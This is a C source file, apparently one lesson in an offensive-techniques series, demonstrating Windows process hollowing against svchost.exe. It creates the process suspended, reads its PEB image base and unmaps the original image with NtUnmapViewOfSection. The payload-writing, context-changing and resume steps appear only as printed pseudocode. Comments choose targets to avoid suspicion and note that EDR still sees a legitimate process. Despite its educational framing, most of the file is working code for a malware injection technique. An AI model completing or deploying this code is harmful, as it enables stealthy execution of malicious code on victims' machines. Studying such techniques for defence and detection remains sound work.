/*
 * 04_process_hollowing.c
 * =======================
 * Process Hollowing (RunPE)
 *
 * Concept: creates a legitimate process in a suspended state, hollows out its memory,
 * and fills it with our payload. The process continues with the original name
 * (e.g.: svchost.exe) but executes our code.
 *
 * Summarized flow:
 *   1. CreateProcess with CREATE_SUSPENDED -> process stopped before executing
 *   2. NtUnmapViewOfSection -> removes the original image from memory
 *   3. VirtualAllocEx -> allocates space for our PE
 *   4. WriteProcessMemory -> writes the malicious PE
 *   5. SetThreadContext -> adjusts the entry point to point to our code
 *   6. ResumeThread -> process "wakes up" executing our payload
 *
 * NOTE: this example shows the structure and logical flow.
 * A complete implementation needs to parse PE headers (DOS, NT, sections)
 * and relocate the binary. Here we focus on understanding the APIs.
 *
 * Compile: cl.exe /O2 04_process_hollowing.c ntdll.lib
 */

#include <windows.h>
#include <stdio.h>

/*
 * Prototype definition for NtUnmapViewOfSection
 *
 * This function is not officially documented by Microsoft (it's an "Nt function").
 * It removes (unmaps) a memory region from a process.
 * We use it to "hollow out" the target process before filling it with our PE.
 *
 * NTSTATUS = standard return type for Nt functions (0 = success)
 * ProcessHandle = handle to the target process
 * BaseAddress = base address of the region to remove (ImageBase of the original PE)
 */
typedef NTSTATUS (NTAPI* pNtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);


int main() {

    printf("[*] Process Hollowing - Flow Demonstration\n\n");

    /* ---------------------------------------------------------------
     * STEP 1: Create target process in SUSPENDED state
     *
     * STARTUPINFOA contains settings for how the process will start
     * (window, I/O handles, etc). Zeroed = default.
     *
     * PROCESS_INFORMATION receives information about the created process:
     *   - hProcess = process handle
     *   - hThread  = main thread handle
     *   - dwProcessId = PID
     *
     * CREATE_SUSPENDED = creates the process but does NOT execute it.
     * The main thread stays stopped before running any code.
     * This gives us a window to manipulate memory before the
     * original executable starts.
     * --------------------------------------------------------------- */
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));  /* zero the entire struct */
    si.cb = sizeof(si);           /* mandatory: struct size */
    ZeroMemory(&pi, sizeof(pi));

    /*
     * We create svchost.exe as the target - it's a common Windows process
     * that exists in multiple instances, so one more doesn't raise suspicion.
     * Other options: RuntimeBroker.exe, dllhost.exe, explorer.exe
     */
    char targetProcess[] = "C:\\Windows\\System32\\svchost.exe";

    BOOL success = CreateProcessA(
        targetProcess,    /* executable path */
        NULL,             /* no command line arguments */
        NULL,             /* no security attributes for the process */
        NULL,             /* no security attributes for the thread */
        FALSE,            /* don't inherit handles */
        CREATE_SUSPENDED, /* <<<< KEY: process created STOPPED */
        NULL,             /* use parent's environment block */
        NULL,             /* use parent's current directory */
        &si,              /* startup configuration */
        &pi               /* receives created process information */
    );

    if (!success) {
        printf("[!] Failed to create process. Error: %lu\n", GetLastError());
        return 1;
    }

    printf("[+] Process created (SUSPENDED)\n");
    printf("    PID: %lu\n", pi.dwProcessId);
    printf("    Process Handle: 0x%p\n", pi.hProcess);
    printf("    Thread Handle: 0x%p\n", pi.hThread);

    /* ---------------------------------------------------------------
     * STEP 2: Get the main thread context
     *
     * CONTEXT contains the complete state of the CPU registers:
     *   - Rax, Rbx, Rcx, Rdx (general purpose registers)
     *   - Rip (instruction pointer - points to the next instruction)
     *   - Rdx (at CreateProcess time, contains the PEB address)
     *
     * We need the context to:
     *   1. Know where the PEB (Process Environment Block) is
     *   2. Read the ImageBase of the original process
     *   3. Later: change Rcx/Rax to point to our entry point
     *
     * CONTEXT_FULL = get ALL registers
     * --------------------------------------------------------------- */
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;

    if (!GetThreadContext(pi.hThread, &ctx)) {
        printf("[!] Failed to get context. Error: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 0);
        return 1;
    }

    printf("[+] Context obtained\n");

    #ifdef _WIN64
        /*
         * On x64: Rdx points to the PEB at suspended creation time.
         * PEB + 0x10 contains the ImageBase of the loaded executable.
         *
         * PEB (Process Environment Block) is a struct that contains
         * process information: loaded modules, command line parameters,
         * environment variables, etc.
         */
        printf("    RIP (Instruction Pointer): 0x%llx\n", ctx.Rip);
        printf("    RDX (PEB Address): 0x%llx\n", ctx.Rdx);

        /* Read the original ImageBase from the PEB */
        ULONGLONG imageBase = 0;
        ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + 0x10), &imageBase, sizeof(imageBase), NULL);
        printf("    Original ImageBase: 0x%llx\n", imageBase);
    #else
        printf("    EAX (Entry Point): 0x%lx\n", ctx.Eax);
        printf("    EBX (PEB Address): 0x%lx\n", ctx.Ebx);

        DWORD imageBase = 0;
        ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Ebx + 8), &imageBase, sizeof(imageBase), NULL);
        printf("    Original ImageBase: 0x%lx\n", imageBase);
    #endif

    /* ---------------------------------------------------------------
     * STEP 3: Unmap the original image (NtUnmapViewOfSection)
     *
     * Now we'll "hollow out" the process. We remove the original
     * executable from memory to make room for ours.
     *
     * NtUnmapViewOfSection is not normally exported - we need
     * to resolve its address in ntdll.dll manually.
     * --------------------------------------------------------------- */
    pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(
        GetModuleHandleA("ntdll.dll"),
        "NtUnmapViewOfSection"
    );

    if (NtUnmapViewOfSection == NULL) {
        printf("[!] NtUnmapViewOfSection not found\n");
        TerminateProcess(pi.hProcess, 0);
        return 1;
    }

    /*
     * Remove the original process image at the imageBase address.
     * After this, that memory region becomes free.
     */
    NTSTATUS status = NtUnmapViewOfSection(pi.hProcess, (PVOID)imageBase);
    printf("[+] Original image removed (status: 0x%08x)\n", status);

    /* ---------------------------------------------------------------
     * STEP 4: Allocate new memory and write the malicious PE
     *
     * Here you would allocate memory at the same address (imageBase)
     * and write your PE section by section:
     *   - PE Headers (DOS + NT + Section Headers)
     *   - .text (code)
     *   - .data (data)
     *   - .rsrc (resources)
     *
     * Each section needs to be written at the correct offset based
     * on the VirtualAddress from the section header.
     *
     * [PSEUDOCODE - replace with real PE]
     * --------------------------------------------------------------- */
    printf("[*] Here you would write the malicious PE section by section\n");
    printf("    1. VirtualAllocEx at imageBase with SizeOfImage size\n");
    printf("    2. WriteProcessMemory for headers\n");
    printf("    3. Loop: WriteProcessMemory for each section\n");
    printf("    4. Update ImageBase in PEB if necessary\n");

    /* ---------------------------------------------------------------
     * STEP 5: Update the entry point in the thread context
     *
     * We change the register that points to the entry point to point
     * to the AddressOfEntryPoint of our PE.
     *
     * On x64: ctx.Rcx = newEntryPoint
     * On x86: ctx.Eax = newEntryPoint
     *
     * SetThreadContext applies the changes to the suspended thread.
     * --------------------------------------------------------------- */
    printf("[*] Here you would adjust ctx.Rcx to the new entry point\n");
    printf("    and call SetThreadContext(pi.hThread, &ctx)\n");

    /* ---------------------------------------------------------------
     * STEP 6: Resume the thread
     *
     * ResumeThread "wakes up" the main thread.
     * It will start executing from the entry point we defined,
     * which now points to our malicious code.
     *
     * From the perspective of Windows and the EDR, the process is still
     * "svchost.exe" with the original PID. But the code being executed
     * is ours.
     * --------------------------------------------------------------- */
    printf("\n[!] NOT resuming thread (educational example)\n");
    printf("    In production: ResumeThread(pi.hThread)\n");

    /* Cleanup - in production we wouldn't do this */
    TerminateProcess(pi.hProcess, 0);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    printf("\n[+] Demonstration complete.\n");
    return 0;
}
